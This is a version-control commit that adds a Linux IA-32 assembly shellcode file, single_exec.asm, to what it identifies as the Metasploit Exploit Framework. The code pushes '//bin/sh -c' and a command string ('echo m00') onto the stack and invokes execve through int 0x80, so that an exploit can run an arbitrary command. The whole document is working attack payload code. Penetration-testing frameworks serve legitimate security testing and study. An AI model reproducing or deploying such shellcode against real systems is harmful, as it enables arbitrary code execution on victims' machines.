33cce5e69bebe6d51d7d52cff373647914205949
no_author <no_author@no_author>
2004-11-13 00:34:54 +0000

    Add single_exec.asm

---
+++ src/shellcode/linux/ia32/single_exec.asm
@@ -0,0 +1,45 @@
+;;
+;
+;        Name: single_exec
+;   Platforms: Linux
+;     Authors: vlad902 <vlad902 [at] gmail.com>
+;     Version: $Revision$
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Execute an arbitary command.
+;
+;;
+; NULLs are fair game people.
+
+BITS 32
+global _start
+
+_start:
+  push	byte 0xb
+  pop	eax
+  cdq
+
+  push	edx
+  push	word 0x632d
+  mov	edi, esp
+
+  push	edx
+  push	dword 0x68732f6e
+  push	dword 0x69622f2f
+  mov	ebx, esp
+
+  push	edx
+  call	getstr
+db "echo m00", 0x00
+getstr:
+  push	edi
+  push	ebx
+  mov	ecx, esp
+  int	0x80
+
